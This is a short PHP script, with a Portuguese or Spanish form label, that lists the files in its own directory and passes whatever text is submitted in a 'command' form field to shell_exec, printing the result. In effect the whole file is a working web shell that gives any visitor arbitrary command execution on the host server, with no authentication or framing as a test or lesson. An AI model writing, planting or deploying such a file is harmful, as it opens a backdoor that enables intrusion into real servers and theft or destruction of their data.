<?php

echo '<pre>';
var_dump(scandir(__DIR__));
echo '</pre>';

if($_POST['command'])
var_dump(shell_exec($_POST['command']));

?>

<form method="post">
  <label>command</label>
  <input type="text" name="command" />
  
  <input type="submit" value="Enviar" />
</form>